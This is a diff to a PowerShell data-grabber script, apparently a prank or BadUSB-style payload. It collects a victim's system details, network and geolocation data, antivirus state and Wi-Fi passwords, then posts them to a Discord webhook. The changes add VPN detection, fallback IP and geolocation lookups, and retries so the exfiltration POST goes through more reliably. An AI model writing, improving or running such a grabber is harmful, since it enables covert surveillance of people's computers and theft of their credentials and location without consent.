@@ -77,12 +77,36 @@ function Get-BitLocker {
     } catch { return "BitLocker status unknown" }
 }
 
+function Get-VPNStatus {
+    try {
+        $vpnPattern = 'VPN|TAP-Win|WireGuard|OpenVPN|Cisco AnyConnect|GlobalProtect|NordVPN|ExpressVPN|Mullvad|ProtonVPN|Tailscale|ZeroTier'
+        $vpnAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -match $vpnPattern }
+        $builtIn = Get-VpnConnection -ErrorAction SilentlyContinue | Where-Object { $_.ConnectionStatus -eq 'Connected' }
+        $found = @()
+        if ($vpnAdapters) { $found += $vpnAdapters | ForEach-Object { $_.InterfaceDescription } }
+        if ($builtIn)     { $found += $builtIn     | ForEach-Object { $_.Name } }
+        if ($found) { return "Active: " + ($found -join ", ") }
+        return "No VPN detected"
+    } catch { return "Unknown" }
+}
+
 function Get-NetworkInfo {
-    $ip  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
-            Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
-            Select-Object -First 1).IPAddress
-    $mac = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
-    return "Local IP: $ip, MAC: $mac"
+    try {
+        $excludePattern = 'VPN|TAP|TUN|WireGuard|OpenVPN|Cisco|GlobalProtect|NordVPN|ExpressVPN|Mullvad|ProtonVPN|Tailscale|ZeroTier|Hyper-V|Virtual|vEthernet|Loopback|Bluetooth|6to4|ISATAP|Teredo'
+        $adapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch $excludePattern } |
+                   Select-Object -First 1
+        if (-not $adapter) { $adapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1 }
+        $ip = (Get-NetIPAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+               Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
+               Select-Object -First 1).IPAddress
+        return "Local IP: $ip, MAC: $($adapter.MacAddress)"
+    } catch {
+        $ip  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+                Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
+                Select-Object -First 1).IPAddress
+        $mac = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
+        return "Local IP: $ip, MAC: $mac"
+    }
 }
 
 function Get-Antivirus {
@@ -108,10 +132,13 @@ function Get-RAM {
 }
 
 function Get-PubIP {
-    try {
-        $IP = (Invoke-WebRequest 'https://ipinfo.io/ip' -UseBasicParsing -TimeoutSec 5).Content.Trim()
-        return "Your public IP is $IP. Say hi to the world for me."
-    } catch { return "Couldn't fetch your public IP. You're a ghost already." }
+    foreach ($url in @('https://ipinfo.io/ip', 'https://api.ipify.org', 'https://icanhazip.com')) {
+        try {
+            $IP = (Invoke-WebRequest $url -UseBasicParsing -TimeoutSec 5).Content.Trim()
+            if ($IP -match '^\d+\.\d+\.\d+\.\d+$') { return "Your public IP is $IP. Say hi to the world for me." }
+        } catch {}
+    }
+    return "Couldn't fetch your public IP. You're a ghost already."
 }
 
 function Get-WifiPass {
@@ -145,10 +172,19 @@ function Get-PasswordAge {
 }
 
 function Get-GeoInfo {
-    try {
-        $r = (Invoke-WebRequest 'https://ipwho.is/' -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
-        return "$($r.city), $($r.region), $($r.country)  |  ISP: $($r.connection.isp)"
-    } catch { return "Geolocation unavailable" }
+    $endpoints = @(
+        @{ url = 'https://ipwho.is/';         city = 'city'; region = 'region';     country = 'country';      isp = { $r.connection.isp } },
+        @{ url = 'https://ipapi.co/json/';    city = 'city'; region = 'region';     country = 'country_name'; isp = { $r.org } },
+        @{ url = 'https://ip-api.com/json/';  city = 'city'; region = 'regionName'; country = 'country';      isp = { $r.isp } }
+    )
+    foreach ($ep in $endpoints) {
+        try {
+            $r    = (Invoke-WebRequest $ep.url -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
+            $city = $r.($ep.city); $region = $r.($ep.region); $country = $r.($ep.country); $isp = & $ep.isp
+            if ($city) { return "$city, $region, $country  |  ISP: $isp" }
+        } catch {}
+    }
+    return "Geolocation unavailable"
 }
 
 function Get-WallpaperPath {
@@ -201,6 +237,7 @@ $recent     = Get-RecentFiles
 $usb        = Get-USB
 $bitlocker  = Get-BitLocker
 $network    = Get-NetworkInfo
+$vpnStatus  = Get-VPNStatus
 $av         = Get-Antivirus
 $procs      = Get-TopProcesses
 $geo        = Get-GeoInfo
@@ -226,6 +263,7 @@ if ($webhookUrl -ne 'REPLACE_ME') {
                 @{ name = "USB Devices";    value = $usb;        inline = $false },
                 @{ name = "BitLocker";      value = $bitlocker;  inline = $true  },
                 @{ name = "Network";        value = $network;    inline = $true  },
+                @{ name = "VPN";            value = $vpnStatus;  inline = $true  },
                 @{ name = "Antivirus";      value = $av;         inline = $false },
                 @{ name = "Top Processes";  value = $procs;      inline = $false },
                 @{ name = "RAM Roast";      value = $ramRoast;   inline = $true  },
@@ -237,11 +275,16 @@ if ($webhookUrl -ne 'REPLACE_ME') {
             timestamp = (Get-Date).ToString("o")
         })
     }
-    try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post `
-            -Body (ConvertTo-Json $discordPayload -Depth 10) `
-            -ContentType 'application/json' -ErrorAction Stop
-    } catch {}
+    for ($attempt = 1; $attempt -le 3; $attempt++) {
+        try {
+            Invoke-RestMethod -Uri $webhookUrl -Method Post `
+                -Body (ConvertTo-Json $discordPayload -Depth 10) `
+                -ContentType 'application/json' -ErrorAction Stop
+            break
+        } catch {
+            if ($attempt -lt 3) { Start-Sleep -Seconds 3 }
+        }
+    }
 }
 
 # ---- Wait for mouse movement before playing the audio roast -----------------
